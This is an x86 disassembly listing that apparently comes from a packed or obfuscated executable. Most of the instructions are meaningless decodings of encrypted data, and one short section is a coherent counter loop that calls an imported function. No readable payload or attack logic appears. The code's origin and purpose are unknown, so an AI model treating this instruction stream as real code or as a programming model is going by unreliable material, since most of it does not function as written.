  40402e:	xor    eax,0x4d53b170
  404033:	fidivr WORD PTR [edx]
  404035:	xor    eax,0xe22d03c
  40403a:	aaa    
  40403b:	es jge 0x40403b
  40403e:	push   edx
  40403f:	mov    eax,0xc92e416e
  404044:	test   BYTE PTR [ebp+0x12ab62a6],ah
  40404a:	push   cs
  40404b:	add    ah,bl
  40404d:	jb     0x40406f
  40404f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404050:	push   0x568cf88c
  404055:	pop    esi
  404056:	mov    edx,0xa4d29d02
  40405b:	push   esi
  40405c:	xlat   BYTE PTR ds:[ebx]
  40405d:	mov    esp,0x5bce117
  404062:	mov    edi,ds
  404064:	pop    esp
  404065:	fild   WORD PTR [eax-0x48]
  404068:	xor    DWORD PTR [edi],esp
  40406a:	pop    ss
  40406b:	sbb    ecx,DWORD PTR [edi+eax*4+0x21c3dae5]
  404072:	sti    
  404073:	stc    
  404074:	adc    eax,0x3e0ad2af
  404079:	adc    al,0x11
  40407b:	pop    ds
  40407c:	aam    0x2f
  40407e:	ficomp WORD PTR [ebp+0x74887999]
  404084:	pop    ss
  404085:	(bad)  
  404086:	mov    al,ds:0xe2819255
  40408b:	int    0x69
  40408d:	lods   eax,DWORD PTR ds:[esi]
  40408e:	and    dh,bl
  404090:	cmp    ebp,DWORD PTR [edx-0x13fe2bc6]
  404096:	loope  0x404114
  404098:	inc    eax
  404099:	jno    0x4040f5
  40409b:	mov    eax,ds:0x19bb23ee
  4040a0:	dec    ebx
  4040a1:	bound  edx,QWORD PTR [esi-0x644f9749]
  4040a7:	cmp    eax,0x966aea29
  4040ac:	mov    ebp,0x644db83d
  4040b1:	ins    BYTE PTR es:[edi],dx
  4040b2:	pop    esi
  4040b3:	jecxz  0x40409f
  4040b5:	and    DWORD PTR [edx],0xb4f1461d
  4040bb:	and    al,0xd7
  4040bd:	clc    
  4040be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040bf:	adc    DWORD PTR [ebp-0x9],edx
  4040c2:	push   ecx
  4040c3:	sti    
  4040c4:	push   0xffffffdb
  4040c6:	stos   BYTE PTR es:[edi],al
  4040c7:	pop    ebp
  4040c8:	jle    0x404081
  4040ca:	xchg   ebp,eax
  4040cb:	jae    0x40414c
  4040cd:	jmp    0xc5d37b6d
  4040d2:	add    BYTE PTR [ebx+0x29bfb8dd],0x63
  4040d9:	add    DWORD PTR [ecx],ebx
  4040db:	xor    ah,BYTE PTR [edx+ecx*4-0x510e687c]
  4040e2:	pop    edx
  4040e3:	int3   
  4040e4:	xor    edx,ebp
  4040e6:	dec    ebp
  4040e7:	or     ah,ch
  4040e9:	out    0xc3,al
  4040eb:	daa    
  4040ec:	adc    BYTE PTR [edi-0x6f],bl
  4040ef:	push   esp
  4040f0:	jne    0x4040b2
  4040f2:	sbb    DWORD PTR [edi+ebp*1],esi
  4040f5:	ret    
  4040f6:	and    eax,0x91a4275a
  4040fb:	mov    esi,0x1e4faef3
  404100:	aaa    
  404101:	adc    DWORD PTR [edi+ebp*1+0x1b],edi
  404105:	mov    cs,WORD PTR [ebp-0x74a096b8]
  40410b:	pop    esp
  40410c:	xor    edi,DWORD PTR [edx]
  40410e:	pop    ebx
  40410f:	mov    BYTE PTR [ebp-0x4b],al
  404112:	inc    edx
  404113:	jne    0x404132
  404115:	inc    di
  404117:	fmulp  st(4),st
  404119:	cmp    al,0xcc
  40411b:	popa   
  40411c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40411d:	lahf   
  40411e:	inc    ecx
  40411f:	out    0x4d,eax
  404121:	push   cs
  404122:	add    dl,BYTE PTR fs:[ebx+ecx*2]
  404126:	xor    eax,0x7aa5edf8
  40412b:	mov    edx,0xdf47cc6d
  404130:	jno    0x4040f3
  404132:	mov    eax,ds:0x38deaccf
  404137:	mov    ds:0xb515caf4,eax
  40413c:	add    edi,DWORD PTR [ebp-0x32dc5a0e]
  404142:	test   al,0x2
  404144:	shl    BYTE PTR [ecx+eax*4-0x23],0x33
  404149:	xchg   BYTE PTR [edx],dh
  40414b:	and    ebp,esi
  40414d:	shl    DWORD PTR [ebx+0x40],cl
  404150:	cmp    eax,edi
  404152:	arpl   di,si
  404154:	inc    esp
  404155:	call   0xccbc966a
  40415a:	jno    0x4040f5
  40415c:	(bad)  
  40415d:	in     eax,dx
  40415e:	mov    eax,ds:0x7f60f5a0
  404163:	inc    edx
  404164:	rol    dh,cl
  404166:	out    0xac,eax
  404168:	or     dl,BYTE PTR [edi-0x700127da]
  40416e:	adc    al,0xcc
  404170:	scas   al,BYTE PTR es:[edi]
  404171:	xchg   esi,eax
  404172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404173:	jo     0x404127
  404175:	adc    esp,ecx
  404177:	sahf   
  404178:	icebp  
  404179:	outs   dx,BYTE PTR ds:[esi]
  40417a:	sbb    DWORD PTR [ebx-0xf],ebp
  40417d:	int3   
  40417e:	stos   DWORD PTR es:[edi],eax
  40417f:	inc    ebx
  404180:	rol    BYTE PTR [ecx],1
  404182:	push   0x28e6cb32
  404187:	push   0x53
  404189:	fidiv  WORD PTR [ecx]
  40418b:	icebp  
  40418c:	mov    cl,0x14
  40418e:	inc    ebx
  40418f:	rol    BYTE PTR [ebp+0x18],cl
  404192:	sub    BYTE PTR [esi],al
  404194:	out    dx,al
  404195:	popa   
  404196:	test   DWORD PTR [ebx-0x44719af4],ebp
  40419c:	or     BYTE PTR ds:0xd9bb4c5b,bh
  4041a2:	or     ebx,ecx
  4041a4:	pop    ebp
  4041a5:	adc    DWORD PTR [ebx-0x2d09a111],0x48
  4041ac:	cld    
  4041ad:	shl    BYTE PTR [ebx+ecx*1-0x26],cl
  4041b1:	fst    DWORD PTR ds:0x55ffe3a9
  4041b7:	jno    0x4041c2
  4041b9:	data16 jp 0x40416e
  4041bc:	cli    
  4041bd:	fistp  DWORD PTR [esi+0x1a]
  4041c0:	push   es
  4041c1:	cmp    eax,0xc9966674
  4041c6:	jp     0x404225
  4041c8:	add    eax,0x96cdd3a6
  4041cd:	jo     0x40421c
  4041cf:	ins    DWORD PTR es:[edi],dx
  4041d0:	shr    cl,cl
  4041d2:	cmp    BYTE PTR [ecx-0x54925a62],ch
  4041d8:	ret    
  4041d9:	stos   DWORD PTR es:[edi],eax
  4041da:	fisttp DWORD PTR [ecx-0x489771f5]
  4041e0:	xchg   ah,al
  4041e2:	inc    eax
  4041e3:	push   edi
  4041e4:	push   0xffffff8e
  4041e6:	or     ecx,ebp
  4041e8:	les    eax,FWORD PTR [edx-0x1d2d0b13]
  4041ee:	jecxz  0x4041bb
  4041f0:	add    DWORD PTR [edi-0x53],esi
  4041f3:	ror    DWORD PTR [edx+0x591da31c],1
  4041f9:	mov    bl,0x29
  4041fb:	sti    
  4041fc:	mov    esi,0xd671b696
  404201:	in     eax,dx
  404202:	mov    al,ds:0x791f8cd2
  404207:	in     al,0x78
  404209:	push   ss
  40420a:	fsub   QWORD PTR [eax+ecx*8+0x4f]
  40420e:	or     DWORD PTR [ebx],esi
  404210:	adc    BYTE PTR [ebx-0x851052a],bh
  404216:	fst    QWORD PTR [edx+ebp*4]
  404219:	inc    eax
  40421a:	test   ah,al
  40421c:	xchg   DWORD PTR [esi],esi
  40421e:	nop    DWORD PTR [eax]
  404221:	js     0x40423c
  404223:	mov    cl,0xe1
  404225:	rol    BYTE PTR [ecx+0x22],0x5e
  404229:	jmp    0xd123cfa4
  40422e:	sub    edi,DWORD PTR [edx]
  404230:	sbb    esp,DWORD PTR [ebx+eiz*2-0x565824b8]
  404237:	inc    ecx
  404238:	lock or ah,al
  40423b:	xchg   ebp,eax
  40423c:	pop    edi
  40423d:	mov    eax,ds:0x1ac4ba03
  404242:	(bad)
  404245:	sbb    ch,BYTE PTR [esi+0x4a60a9a4]
  40424b:	sbb    BYTE PTR [ebp+0x780ab562],ah
  404251:	jecxz  0x40421b
  404253:	int3   
  404254:	add    ch,BYTE PTR [edi+0x36]
  404257:	xor    BYTE PTR [ebx+esi*8-0x48],dl
  40425b:	fisttp QWORD PTR [ebx-0x27]
  40425e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40425f:	enter  0x7e52,0x1
  404263:	push   esi
  404264:	mov    bl,dh
  404266:	hlt    
  404267:	lods   eax,DWORD PTR ds:[esi]
  404268:	and    eax,DWORD PTR [edx]
  40426a:	loopne 0x4042b6
  40426c:	int    0x9c
  40426e:	rol    DWORD PTR [esi-0x2a373d70],cl
  404274:	jecxz  0x4042aa
  404276:	popa   
  404277:	cwde   
  404278:	dec    eax
  404279:	jne    0x4042bc
  40427b:	push   ebp
  40427c:	out    0xe6,al
  40427e:	lahf   
  40427f:	addr16 addr16 into 
  404282:	and    cl,al
  404284:	out    0xbb,eax
  404286:	mov    eax,0x5154876c
  40428b:	jge    0x4042ef
  40428d:	or     DWORD PTR [ecx+ebx*4+0x48],ebp
  404291:	nop
  404292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404293:	and    esi,ebp
  404295:	sbb    dh,BYTE PTR ds:0x972344d
  40429b:	dec    ebp
  40429c:	sahf   
  40429d:	xor    eax,0x1c8ca8a8
  4042a2:	add    ah,ch
  4042a4:	jge    0x4042f4
  4042a6:	xor    DWORD PTR [edx+0xb],ebp
  4042a9:	or     al,0x56
  4042ab:	dec    edi
  4042ac:	push   ebx
  4042ad:	xor    BYTE PTR [ebx-0x32396872],ah
  4042b3:	(bad)  
  4042b4:	sub    DWORD PTR [ecx-0x3f56f4cb],eax
  4042ba:	repz int 0x8f
  4042bd:	cmp    cl,BYTE PTR [edi+0x35]
  4042c0:	mov    bh,0x2e
  4042c2:	add    BYTE PTR [ecx+0x518db57f],dl
  4042c8:	and    al,0x9b
  4042ca:	sahf   
  4042cb:	mov    al,0x71
  4042cd:	retf   
  4042ce:	loope  0x4042e6
  4042d0:	cmc    
  4042d1:	sbb    al,ch
  4042d3:	pop    ebp
  4042d4:	jmp    0x2817:0x5a863290
  4042db:	fldcw  WORD PTR [ebx]
  4042dd:	jae    0x4042b8
  4042df:	jge    0x4042c5
  4042e1:	and    eax,0xf7d41ad4
  4042e6:	jp     0x404311
  4042e8:	inc    esp
  4042e9:	xor    al,0x9a
  4042eb:	fs (bad) 
  4042ed:	push   ss
  4042ee:	jg     0x4042fd
  4042f0:	pusha  
  4042f1:	das    
  4042f2:	sti    
  4042f3:	pop    esp
  4042f4:	in     eax,0x88
  4042f6:	jb     0x4042e0
  4042f8:	xchg   ebp,eax
  4042f9:	repnz inc ebp
  4042fb:	fdivr  st(6),st
  4042fd:	xchg   ebx,eax
  4042fe:	xor    ch,BYTE PTR [ebx-0x62]
  404301:	push   0x3144b239
  404306:	jae    0x40431a
  404308:	cmc    
  404309:	inc    ebp
  40430a:	and    DWORD PTR [edx],0xffffffa3
  40430d:	jb     0x404315
  40430f:	adc    ecx,DWORD PTR [ebx+ecx*2]
  404312:	push   0x31d3c2c6
  404317:	icebp  
  404318:	dec    edx
  404319:	fistp  QWORD PTR [edx-0x35834825]
  40431f:	push   esp
  404320:	cmp    DWORD PTR [edx+eax*4+0x5da074c9],edi
  404327:	adc    bh,BYTE PTR [esi]
  404329:	loopne 0x4042f7
  40432b:	push   edx
  40432c:	test   BYTE PTR [ebx+0x4c0e7171],dh
  404332:	jg     0x40436f
  404334:	dec    eax
  404335:	xchg   DWORD PTR [esi-0x206a8a08],ebx
  40433b:	inc    esi
  40433c:	dec    esp
  40433d:	push   edx
  40433e:	push   eax
  40433f:	test   al,0x88
  404341:	jo     0x40437e
  404343:	xchg   DWORD PTR [eax],edx
  404345:	dec    edi
  404346:	sub    al,0xc1
  404348:	shr    al,0x34
  40434b:	neg    edi
  40434d:	xchg   ecx,eax
  40434e:	xor    dl,bl
  404350:	and    eax,DWORD PTR [esi]
  404352:	xchg   ebp,eax
  404353:	cmp    ch,BYTE PTR [eax-0x72dc911a]
  404359:	cwde   
  40435a:	popf   
  40435b:	stos   BYTE PTR es:[edi],al
  40435c:	lods   al,BYTE PTR ds:[esi]
  40435d:	sub    ebp,DWORD PTR [eax]
  40435f:	xor    eax,0xf1dff109
  404364:	or     ebx,DWORD PTR [ecx-0xe]
  404367:	pop    esp
  404368:	mov    ch,0x2b
  40436a:	push   ecx
  40436b:	push   esi
  40436c:	xor    ch,BYTE PTR [edx]
  40436e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40436f:	fwait
  404370:	outs   dx,DWORD PTR ds:[esi]
  404371:	jb     0x404392
  404373:	lds    ecx,FWORD PTR [edi-0x3cb264b6]
  404379:	into   
  40437a:	xor    BYTE PTR [edx+edx*8],bh
  40437d:	adc    al,0x10
  40437f:	cmc    
  404380:	mov    edx,0xf39bc16c
  404385:	dec    ebx
  404386:	sub    ch,bl
  404388:	out    0x40,al
  40438a:	ja     0x40436e
  40438c:	stc    
  40438d:	push   ss
  40438e:	inc    eax
  40438f:	sub    dh,BYTE PTR [edx-0x4d]
  404392:	dec    ebx
  404393:	add    BYTE PTR [esp+ecx*1],bh
  404396:	cmp    al,0xc0
  404398:	(bad)  
  404399:	pop    es
  40439a:	stc    
  40439b:	cmp    esp,DWORD PTR ds:0x4e4b3aac
  4043a1:	jae    0x4043b8
  4043a3:	sub    DWORD PTR [eax+0x2c04c8bf],ebp
  4043a9:	add    al,0xb9
  4043ab:	jo     0x404382
  4043ad:	and    DWORD PTR [edx+0x3b18ac28],0xffffff96
  4043b4:	inc    edx
  4043b5:	fcomp  st(1)
  4043b7:	sub    DWORD PTR ds:0x8e61d445,esp
  4043bd:	rcl    BYTE PTR ss:[esi],0x9b
  4043c1:	shl    DWORD PTR [esi+0xb],cl
  4043c4:	cmp    eax,0x94bbe2c4
  4043c9:	mov    edi,0xb522de64
  4043ce:	inc    ecx
  4043cf:	ds cmc 
  4043d1:	xchg   BYTE PTR [edi+0x59f4abef],bl
  4043d7:	(bad)  
  4043d8:	mov    ebx,0xf6216bdd
  4043dd:	jmp    0xdfe0:0xa194f51a
  4043e4:	sub    esi,DWORD PTR [edi+0x5f]
  4043e7:	imul   ebp,DWORD PTR [ecx],0xffffffc4
  4043ea:	fadd   DWORD PTR [edi-0x4e2549f0]
  4043f0:	sub    eax,0xcc6cafcd
  4043f5:	jo     0x4043c5
  4043f7:	inc    eax
  4043f8:	mov    cl,0xc8
  4043fa:	fstp   st(5)
  4043fc:	in     al,0xe9
  4043fe:	stos   DWORD PTR es:[edi],eax
  4043ff:	sub    al,0xa8
  404401:	les    ebp,FWORD PTR [ebp+esi*8-0x38ffb376]
  404408:	shr    DWORD PTR [edx-0x31fa2409],cl
  40440e:	lahf   
  40440f:	clc    
  404410:	test   al,0x50
  404412:	xchg   DWORD PTR [esi],ecx
  404414:	outs   dx,BYTE PTR ds:[esi]
  404415:	sbb    ah,ch
  404417:	or     al,0x8
  404419:	jb     0x404476
  40441b:	push   eax
  40441c:	in     eax,dx
  40441d:	test   DWORD PTR [ecx+0x63],ebp
  404420:	push   es
  404421:	push   0x854b553d
  404426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404427:	and    BYTE PTR [ebx+0x14],0x7c
  40442b:	sub    DWORD PTR [edi-0x4d4a747a],ecx
  404431:	ror    esi,1
  404433:	or     ebx,DWORD PTR [eax]
  404435:	sbb    bh,BYTE PTR [ecx+0x3]
  404438:	(bad)  
  404439:	out    0x1e,eax
  40443b:	(bad)  
  40443c:	fmul   st,st(0)
  40443e:	or     ebx,DWORD PTR [edx-0x29]
  404441:	adc    cl,BYTE PTR [eax-0x36ecbe5d]
  404447:	jns    0x404433
  404449:	adc    al,BYTE PTR [eax+0x78b030d5]
  40444f:	jnp    0x40444d
  404451:	pop    es
  404452:	jo     0x404467
  404454:	lea    ebp,[esi]
  404456:	jnp    0x4043e6
  404458:	outs   dx,DWORD PTR ds:[esi]
  404459:	dec    eax
  40445a:	sub    DWORD PTR [eax-0x49dae6ad],ebx
  404460:	sbb    eax,0x6e296128
  404465:	jbe    0x40447a
  404467:	cmp    DWORD PTR [edi],0xe1f72259
  40446d:	dec    ebx
  40446e:	(bad)  
  40446f:	fcom   QWORD PTR [edi-0x3e]
  404472:	fstp   TBYTE PTR [ebx-0x63cc002d]
  404478:	jl     0x4044a5
  40447a:	rcl    DWORD PTR [eax+0x71],0x8f
  40447e:	fdivp  st(1),st
  404480:	test   eax,0x5c7b82f1
  404485:	loopne 0x4044cb
  404487:	and    eax,0x364b2400
  40448c:	pushf  
  40448d:	in     al,dx
  40448e:	xlat   BYTE PTR ds:[ebx]
  40448f:	enter  0x2b86,0x30
  404493:	icebp  
  404494:	jns    0x40445a
  404496:	mov    ebp,0x53f07781
  40449b:	sbb    DWORD PTR [esi+0x26418388],ecx
  4044a1:	or     ch,BYTE PTR [ebx]
  4044a3:	add    BYTE PTR [eax+0x37],al
  4044a6:	cdq    
  4044a7:	lods   al,BYTE PTR ds:[esi]
  4044a8:	mov    esp,es
  4044aa:	cmp    BYTE PTR [edi+0xd7dffbd],dl
  4044b0:	mov    esi,0x7cf3786a
  4044b5:	fs dec esi
  4044b7:	xlat   BYTE PTR ds:[ebx]
  4044b8:	push   ebp
  4044b9:	rcl    BYTE PTR [edx+0x2e],1
  4044bc:	mov    dl,0xb4
  4044be:	add    eax,0x7fea323
  4044c3:	pop    es
  4044c4:	mov    BYTE PTR [esi-0x59f3e7fc],cl
  4044ca:	or     edi,ecx
  4044cc:	pushf  
  4044cd:	sbb    BYTE PTR [ecx+edx*2+0x16c9bf91],cl
  4044d4:	ficom  DWORD PTR [edi-0x597fd550]
  4044da:	pop    ebx
  4044db:	mov    dh,0xcf
  4044dd:	jg     0x404522
  4044df:	xor    eax,0x4d275052
  4044e4:	xchg   edi,eax
  4044e5:	scas   eax,DWORD PTR es:[edi]
  4044e6:	mov    esp,0x45d0df63
  4044eb:	xor    DWORD PTR [ecx-0x60],0xa9294bc4
  4044f2:	push   es
  4044f3:	out    0x85,eax
  4044f5:	cmp    al,0x29
  4044f7:	inc    ecx
  4044f8:	add    DWORD PTR ds:[edi-0x46240d00],ecx
  4044ff:	sbb    DWORD PTR [ecx+0x2c3e5a2f],edi
  404505:	jnp    0x40450b
  404507:	mov    edx,0x1f43db1d
  40450c:	lods   eax,DWORD PTR ds:[esi]
  40450d:	pop    esp
  40450e:	leave  
  40450f:	in     eax,dx
  404510:	(bad)  
  404512:	js     0x4044b9
  404514:	or     al,0xa9
  404516:	add    eax,edi
  404518:	mov    DWORD PTR [ebp-0x34],eax
  40451b:	mov    eax,DWORD PTR [ebp-0x44]
  40451e:	and    DWORD PTR ds:0x42a395,0x0
  404528:	xor    ecx,ecx
  40452a:	add    ecx,DWORD PTR ds:0x42a395
  404530:	inc    ecx
  404531:	mov    DWORD PTR ds:0x42a395,ecx
  404537:	cmp    DWORD PTR ds:0x42a395,0x5
  40453e:	jne    0x40455d
  404544:	push   DWORD PTR [ebp-0x18]
  404547:	push   0x8a8f
  40454c:	push   DWORD PTR [ebp-0x18]
  40454f:	push   0x495a
  404554:	push   DWORD PTR [ebp-0x24]
  404557:	call   DWORD PTR ds:0x42534c
  40455d:	cmp    DWORD PTR ds:0x42a395,0x4
  404564:	jne    0x404579
  40456a:	xor    ecx,ecx
  40456c:	add    ecx,DWORD PTR ds:0x42a395
  404572:	inc    ecx
  404573:	mov    DWORD PTR ds:0x42a395,ecx
  404579:	cmp    DWORD PTR ds:0x42a395,0x14
  404580:	jb     0x404528
  404586:	xor    eax,esi
  404588:	jmp    0x404a93
  40458d:	cmp    eax,0xc7cf3fc6
  404592:	aad    0xcd
  404594:	(bad)  
  404595:	dec    esi
  404596:	add    BYTE PTR cs:[ebx+0x40],ch
  40459a:	jbe    0x40455d
  40459c:	mov    dl,0xc4
  40459e:	das    
  40459f:	js     0x404619
  4045a1:	push   0x7c
  4045a3:	js     0x40461d
  4045a5:	mov    dh,0x50
  4045a7:	(bad)  
  4045a8:	mov    al,ds:0x90823f75
  4045ad:	sub    ecx,DWORD PTR [ebx+edx*2-0x80]
  4045b1:	sub    BYTE PTR [esi],al
  4045b3:	jbe    0x404627
  4045b5:	jmp    0x404550
  4045b7:	fisttp WORD PTR [edi+0x42]
  4045ba:	jmp    0x2dee18a7
  4045bf:	sub    DWORD PTR [eax+edi*2+0x2b],ecx
  4045c3:	retf   0x2fe
  4045c6:	jae    0x40455a
  4045c8:	scas   al,BYTE PTR es:[edi]
  4045c9:	mov    edx,0x1348e5a
  4045ce:	sub    eax,0x21bd4109
  4045d3:	jmp    0x4567ae10
  4045d8:	fs push 0x1fe2b9fb
  4045de:	sbb    eax,0xa35a56da
  4045e3:	inc    esi
  4045e4:	ds sbb ecx,ecx
  4045e7:	cmp    al,0xf3
  4045e9:	cdq    
  4045ea:	call   FWORD PTR [ecx]
  4045ec:	jbe    0x404666
  4045ee:	mov    al,0x41
  4045f0:	inc    eax
  4045f1:	xchg   esp,esp
  4045f3:	pushf  
  4045f4:	loop   0x4045d0
  4045f6:	push   cs
  4045f7:	lea    edi,[eax-0x5ceeb183]
  4045fd:	fsubr  QWORD PTR [esi+0x3ec8b1f7]
  404603:	test   al,0x12
  404605:	out    0xec,al
  404607:	adc    al,0x1d
  404609:	sbb    bl,bl
  40460b:	retf   0xc210
  40460e:	fwait
  40460f:	push   esi
  404610:	and    dh,BYTE PTR [edi+ecx*8+0x58a8ee6c]
  404617:	dec    esp
  404618:	jno    0x404662
  40461a:	jge    0x40462d
  40461c:	jae    0x40461f
  40461e:	cli    
  40461f:	push   esp
  404620:	(bad)  
  404621:	test   esi,ecx
  404623:	out    dx,al
  404624:	out    dx,al
  404625:	push   edx
  404626:	push   ds
  404627:	cmp    DWORD PTR [ebp+esi*8+0x39],eax
  40462b:	sub    eax,0x7d702428
  404630:	cmp    DWORD PTR [eax],esi
  404632:	xlat   BYTE PTR ds:[ebx]
  404633:	pop    esi
  404634:	icebp  
  404635:	aam    0x25
  404637:	mov    ebp,0xdf5d1c01
  40463c:	xor    DWORD PTR [edx+ebp*4+0x2],esi
  404640:	inc    ebp
  404641:	test   al,0x86
  404643:	int3   
  404644:	fist   WORD PTR [ecx]
  404646:	pop    ecx
  404647:	outs   dx,DWORD PTR ds:[esi]
  404648:	sahf   
  404649:	xor    BYTE PTR [ebx+0x6f6a41cc],0xdf
  404650:	push   eax
  404651:	push   ebx
  404652:	dec    DWORD PTR [ecx-0x4300ab]
  404658:	push   ebp
  404659:	lods   eax,DWORD PTR ds:[esi]
  40465a:	cmp    al,0xfb
  40465c:	in     al,dx
  40465d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40465e:	test   BYTE PTR [ecx-0x10],0x69
  404662:	xor    eax,DWORD PTR [edx+0x29fb035a]
  404668:	or     bh,BYTE PTR [ecx]
  40466a:	ins    BYTE PTR es:[edi],dx
  40466b:	out    0x22,al
  40466d:	out    dx,eax
  40466e:	mov    ds:0xaaa40734,al
  404673:	pushf  
  404674:	dec    esi
  404675:	cmp    BYTE PTR [ebx+edi*4-0x1b],ch
  404679:	mov    ebp,DWORD PTR [ecx]
  40467b:	ret    
  40467c:	mov    BYTE PTR [ebp+edi*1+0x79b26558],ch
  404683:	adc    BYTE PTR [eax+0x61],al
  404686:	ret    
  404687:	lea    esp,[esi+0x2b]
  40468a:	movsx  ebx,di
  40468d:	jmp    0x35fc:0x4aa2c40
  404694:	in     eax,dx
  404695:	stos   DWORD PTR es:[edi],eax
  404696:	add    DWORD PTR [edx],esp
  404698:	or     bl,BYTE PTR [esi-0x10]
  40469b:	test   DWORD PTR [edx+0x61],ecx
  40469e:	test   BYTE PTR [eax+0x164fbb8c],cl
  4046a4:	outs   dx,DWORD PTR ds:[esi]
  4046a5:	dec    ebp
  4046a6:	pop    es
  4046a7:	and    al,0x8
  4046a9:	cli    
  4046aa:	in     eax,0xae
  4046ac:	icebp  
  4046ad:	int    0xbe
  4046af:	xlat   BYTE PTR ds:[ebx]
  4046b0:	rcl    BYTE PTR [edi+eax*2+0x60],0xbe
  4046b5:	es popf 
  4046b7:	imul   edx,ebp,0x7cf5bbaf
  4046bd:	pop    es
  4046be:	test   cl,al
  4046c0:	fcomp  QWORD PTR [edx]
  4046c2:	cmp    ecx,DWORD PTR [ebp-0x5bb7f1d5]
  4046c8:	les    eax,FWORD PTR [edx-0x1f]
  4046cb:	fs out 0xb6,al
  4046ce:	(bad)  
  4046cf:	js     0x4046e2
  4046d1:	sahf   
  4046d2:	lea    edx,[edi+0x62]
  4046d5:	jno    0x4046dd
  4046d7:	das    
  4046d8:	loop   0x4046e4
  4046da:	xchg   BYTE PTR [ecx],bl
  4046dc:	std    
  4046dd:	add    BYTE PTR [eax],bh
  4046df:	pop    ss
  4046e0:	sbb    eax,0xc80a4b6e
  4046e5:	cld    
  4046e6:	data16 fadd QWORD PTR [ebp+0xc0b28a1]
  4046ed:	test   BYTE PTR [edi-0x525560a7],0x2b
  4046f4:	jecxz  0x4046ae
  4046f6:	bound  esp,QWORD PTR [esi]
  4046f8:	push   ds
  4046f9:	jne    0x404694
  4046fb:	xor    DWORD PTR [edx],esi
  4046fd:	jle    0x4046c6
  4046ff:	sti    
  404700:	sbb    BYTE PTR [esi],0x8f
  404703:	sahf   
  404704:	lods   al,BYTE PTR ds:[esi]
  404705:	mov    al,ds:0x6c456da6
  40470a:	adc    esi,ebx
  40470c:	push   cs
  40470d:	pop    eax
  40470e:	push   DWORD PTR [esi-0x7e]
  404711:	mov    bl,0x5
  404713:	pop    ebp
  404714:	and    al,0x8a
  404716:	pop    ebp
  404717:	mov    cl,0x76
  404719:	out    0xf8,al
  40471b:	dec    ebp
  40471c:	xchg   edx,eax
  40471d:	test   al,0xd9
  40471f:	fnstsw WORD PTR ds:0x47b88984
  404725:	cmp    esi,eax
  404727:	and    cl,BYTE PTR [ebx]
  404729:	scas   eax,DWORD PTR es:[edi]
  40472a:	loop   0x4047aa
  40472c:	mov    eax,0x7a70999e
  404731:	repnz cmp BYTE PTR [edx-0x51],bh
  404735:	loopne 0x404797
  404737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404738:	(bad)  
  404739:	push   edx
  40473a:	mov    ?,WORD PTR [ecx-0x26]
  40473d:	inc    ebp
  40473e:	pop    edi
  40473f:	popa   
  404740:	mov    ds:0xe0d2f38d,eax
  404745:	and    BYTE PTR [ecx+edx*4+0x213d66c4],cl
  40474c:	(bad)  
  40474d:	stc    
  40474e:	jle    0x4046e3
  404750:	popa   
  404751:	pop    edx
  404752:	jmp    0x404717
  404754:	lods   eax,DWORD PTR ds:[esi]
  404755:	mov    ecx,0xd124ac52
  40475a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40475b:	and    ecx,DWORD PTR [eax+0x2464eb14]
  404761:	inc    ecx
  404762:	jge    0x4046fc
  404764:	scas   eax,DWORD PTR es:[edi]
  404765:	and    DWORD PTR [edx-0x3a],ebx
  404768:	xor    esi,edx
  40476a:	mov    esi,0x895d8dd9
  40476f:	addr16 xchg ecx,eax
  404771:	aad    0xa
  404773:	push   es
  404774:	jmp    0x4047b5
  404776:	cwde   
  404777:	int    0xc4
  404779:	mov    bl,0x8
  40477b:	stos   BYTE PTR es:[edi],al
  40477c:	and    BYTE PTR ss:[ebp+0x174010c4],bl
  404783:	mov    al,0x8e
  404785:	call   0x121f:0xe1076d0c
  40478c:	inc    esp
  40478d:	pop    ds
  40478e:	(bad)  
  40478f:	loope  0x40474d
  404791:	mov    dl,0x14
  404793:	mov    eax,ebx
  404795:	pop    ecx
  404796:	cmp    dh,dh
  404798:	int    0xf1
  40479a:	cmc    
  40479b:	ret    0xebda
  40479e:	rcr    ecx,0x5
  4047a1:	ret    
  4047a2:	xchg   BYTE PTR [esi+0x6a333ce7],ah
  4047a8:	in     eax,0x89
  4047aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ab:	jg     0x40481b
  4047ad:	adc    al,0x20
  4047af:	cmc    
  4047b0:	scas   eax,DWORD PTR es:[edi]
  4047b1:	js     0x40475c
  4047b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b4:	frstor [ebx+0x49bf7f79]
  4047ba:	test   BYTE PTR [esi+0x2a],bl
  4047bd:	jo     0x404787
  4047bf:	mov    edi,0x3d4bf110
  4047c4:	add    eax,0xd5ae92fb
  4047c9:	loopne 0x404766
  4047cb:	sti    
  4047cc:	rcl    DWORD PTR [edx+0x5a0ac398],1
  4047d2:	inc    ebx
  4047d3:	mov    al,ds:0x18fc3583
  4047d8:	fadd   DWORD PTR [ebp-0x6e]
  4047db:	cmp    BYTE PTR [ebp+0x515a0d20],ah
  4047e1:	repnz lock test DWORD PTR [ebx+0x48447036],esi
  4047e9:	(bad)  
  4047ea:	and    BYTE PTR [ecx-0x36],0xb0
  4047ee:	loope  0x40478a
  4047f0:	add    ebx,ebp
  4047f2:	outs   dx,BYTE PTR ds:[esi]
  4047f3:	popf   
  4047f4:	cmp    BYTE PTR [esi+esi*4-0x35],bh
  4047f8:	les    esp,FWORD PTR [ecx-0x37]
  4047fb:	mov    ecx,0x6a520934
  404800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404801:	popa   
  404802:	popa   
  404803:	mov    ds:0x53768c3f,al
  404808:	jo     0x404838
  40480a:	inc    ecx
  40480b:	dec    ebp
  40480c:	fs repz push 0xc018b6a
  404813:	jmp    0x89a67992
  404818:	lock xchg esp,eax
  40481a:	add    edi,esp
  40481c:	mov    dl,0xfb
  40481e:	clc    
  40481f:	mov    esi,0x577091ab
  404824:	and    ebx,ebx
  404826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
